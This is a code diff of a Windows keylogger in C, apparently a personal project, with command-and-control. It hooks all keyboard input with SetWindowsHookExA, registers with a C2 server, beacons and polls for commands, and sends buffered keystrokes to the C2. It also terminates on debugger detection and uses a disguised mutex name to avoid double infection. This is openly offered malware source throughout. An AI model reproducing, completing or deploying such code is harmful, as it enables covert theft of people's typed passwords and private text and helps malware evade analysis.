@@ -4,62 +4,61 @@
 
 // prototypes for private functions
 static PROGRAM_CONTEXT* initProgramContext();
-static RET_CODE runKeyLogger();
+static void runKeyLogger();
 static void doShutdown();
 
+// threading and keyboard hooking functions 
 DWORD WINAPI writeLogThread(LPVOID lpParam);
 DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam);
 LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
-
+// global program context variable
 PROGRAM_CONTEXT* ctx;
 
 
 /**
  * Sets up the primary components of the program.
- * Begins by initialising the program context global variable (1),
- * it then registers the client with the C2 server (2) followed by 
- * creating a mutex that will be utilised for safe threading (3).
- * Lastly checks if the mutex already exists, if so this host is 
- * already infected! (4) 
+ * Begins by initialising the program context global variable and then 
+ * registering the client with the C2 server. Lastly it initiailises 
+ * the keylogger's encoding key to the secret key provided by the C2! 
+ * 
+ * @return whether the program initialisation was sucessful
  */
 RET_CODE setup() {
     ctx = initProgramContext(); // 1
     if (ctx == NULL) { return R_NULL; }
 
-    RET_CODE ret = registerClient(ctx->client, &ctx->__KEY__); // 2
+    RET_CODE ret = registerClient(ctx->client, &ctx->SECRET_KEY); // 2
     if (ret != R_SUCCESS) { return ret; }
     
     // set the key loggers encoding key
-    ctx->kLogger->encKey = ctx->__KEY__;
-
-    // 3 create threading mutex with a somewhat believeable name :)
-    ctx->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
-    if (ctx->hMutexThreadSync == NULL)  { return R_NULL; } 
-    if (GetLastError() == ERROR_ALREADY_EXISTS) { return R_SAFE_RET; } // 4 
-
-    printf("\nPROGRAM_CONTEXT initialised...\n\n");
+    ctx->kLogger->encKey = ctx->SECRET_KEY;
     return R_SUCCESS;
 }
 
 
 /**
- * initialises a new program context which will how handles to the worker threads 
- * as well as the mutex
+ * initialises a new PROGRAM_CONTEXT structure. This includes initialisation of:
+ *   - The CLIENT_HANDLER strucutre
+ *   - The KEY_LOGGER strucutre 
+ *   - Creates the keyboard hook
+ *   - Creates the threading Mutex
  */
 static PROGRAM_CONTEXT* initProgramContext() {
     PROGRAM_CONTEXT* prCon = malloc(sizeof(PROGRAM_CONTEXT));
-    if (prCon == NULL) { return NULL; }
+    if (prCon == NULL) { printf("A\n"); return NULL; }
 
     // create client structure
     prCon->client = initClient();
     if (prCon->client == NULL) {
+        printf("B\n");
         free(prCon);
         return NULL;
     }
     // create key logger structure
     prCon->kLogger = initKeyLogger();
     if (prCon->kLogger == NULL) {
+        printf("D\n");
         free(prCon->client);
         free(prCon);
         return NULL;
@@ -67,6 +66,14 @@ static PROGRAM_CONTEXT* initProgramContext() {
     // install the LowLevelKeyboardProc and set the hook
     prCon->hLowLevelKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
     if (prCon->hLowLevelKeyHook == NULL) {
+        printf("E\n");
+        programContextCleanup(prCon);
+        return NULL;
+    }
+    // create mutex and check if it already exists, use a somewhat believeable name :)
+    prCon->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
+    if (prCon->hMutexThreadSync == NULL || GetLastError() == ERROR_ALREADY_EXISTS)  {
+        printf("F\n");
         programContextCleanup(prCon);
         return NULL;
     }
@@ -74,7 +81,6 @@ static PROGRAM_CONTEXT* initProgramContext() {
     prCon->mainThreadId = GetCurrentThreadId();
     prCon->hCmdThread = NULL;
     prCon->hWriteThread = NULL;
-    prCon->hMutexThreadSync = NULL;
     prCon->shutdown = FALSE;
     prCon->sleeping = FALSE;
     return prCon;
@@ -85,6 +91,10 @@ static PROGRAM_CONTEXT* initProgramContext() {
 // --- thread section ---
 // ----------------------
 
+/**
+ * 
+ * @return 
+ */
 RET_CODE startThreads() {
     // create the worker threads
     HANDLE hWriteThr = CreateThread(NULL, 0, writeLogThread, NULL, 0, NULL);
@@ -96,15 +106,15 @@ RET_CODE startThreads() {
     if (ctx->hCmdThread == NULL || ctx->hWriteThread == NULL) {
         return R_NULL;
     }
-    
-    RET_CODE ret = runKeyLogger();
+
+    runKeyLogger();
 
     // wait for both threads to finish
     HANDLE threads[2] = { ctx->hWriteThread, ctx->hCmdThread };
     WaitForMultipleObjects(2, threads, TRUE, INFINITE);
 
     printf("Threads complete!\n");
-    return ret;
+    return R_SUCCESS;
 }
 
 /**
@@ -120,19 +130,20 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
     while (!ctx->shutdown) {
         Sleep(SLP_WRITER_THREAD);
         WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
-        printf("Writing...\n");
-        
+
+#if 1
+        printf("Writing logs to C2...\n\n");
+#endif
+
         // skip the write if the buffer is empty
         if (ctx->kLogger->bufferPtr == 0) { goto skipWrite; }
 
         // tries the to write the key buffer at max 3 times
         int ret = R_POST;
         for (int i = 1; i < 3 && ret == R_POST; i++) {
-            ret = writeKeyLog(ctx->client, ctx->kLogger);
+            ret = writeLogToC2(ctx->client, ctx->kLogger);
         }
-        if (ret != R_SUCCESS) { printRetCode(ret); }
-
-        resetKLBufferAndKey(ctx->kLogger, ctx->__KEY__);
+        resetKLBufferAndKey(ctx->kLogger, ctx->SECRET_KEY);
 
         skipWrite:
         ReleaseMutex(ctx->hMutexThreadSync);
@@ -149,10 +160,12 @@ DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
         Sleep(SLP_CMD_THREAD);
         WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
 
-        printf("Polling...\n");
-        RET_CODE ret = pollCommandsAndBeacon(ctx->client);
+#if 1
+        printf("Polling cmds from C2...\n\n");
+#endif
 
-        // only execute the commands if there is something to exec. or an err was not found
+        RET_CODE ret = pollCommandsAndBeacon(ctx->client);
+        // only execute the commands if there is something to exec
         if (ret != R_SUCCESS) {
             printRetCode(ret);
             goto skipCmds;
@@ -160,9 +173,8 @@ DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
         
         ret = processCommands(ctx->client);
         switch (ret) {
-            case R_DETECT:   // debugger detected
-                HANDLE hPr = GetCurrentProcess();
-                TerminateProcess(hPr, 0);
+            case R_DETECT:   // debugger detected, terminate immediately
+                TerminateProcess(GetCurrentProcess(), 0);
             case R_DO_SHUTDOWN: 
                 doShutdown();
                 break;
@@ -176,8 +188,6 @@ DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
     return 0;
 }
 
-// System.out.println("Hello world! :)");
-
 /**
  * key logger loop that runs on the main thread!
  * This method simply calls the blocking method GetMessageA, this waits for 
@@ -186,13 +196,13 @@ DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
  * which posts a message to the main thread!
  * Resources: https://stackoverflow.com/questions/73340668/how-to-process-key-down-state-on-lowlevelkeyboardproc-with-wh-keyboard
  */
-static RET_CODE runKeyLogger() {
+static void runKeyLogger() {
     MSG msg;
     while (!ctx->shutdown && GetMessageA(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessageA(&msg);
     }
-    return R_SUCCESS;
+    return;
 }
 
 /**
@@ -206,25 +216,29 @@ LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
     DWORD vkCode = keyPress->vkCode;
 
-    // skip key presses that update ke logger state, and key up events
+    // skip key presses that update key logger state (shift, capslock and numlock), and key up events
     BOOL wasUpdated = updateKeyLoggerState(ctx->kLogger, wParam, &vkCode);
     if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
         return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
     }
-    
     RET_CODE ret = addKeyPressToBuffer(ctx->kLogger, &vkCode);
-    if (ret == R_FULL_BUFF) {
-        // do something?
+    if (ret == R_FULL_BUFF) { 
+        // did not implement double and copy logic :(
     }
+
+#if 1  // print out the key log for testing
     printf("%s\n", ctx->kLogger->keyBuffer);
+#endif
+
     return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
 }
 
-
-
+/**
+ * Set the shutdown flag to true! Post a message to the main thread, 
+ * this will cause the runKeyLogger thread loop to terminate!
+ */
 static void doShutdown() {
-    ctx->shutdown = TRUE;  // set the shutdown flag
-    // post a message to the main thread, this will cause it to stop!
+    ctx->shutdown = TRUE;
     PostThreadMessageA(ctx->mainThreadId, WM_QUIT, 0, 0);
 }
 
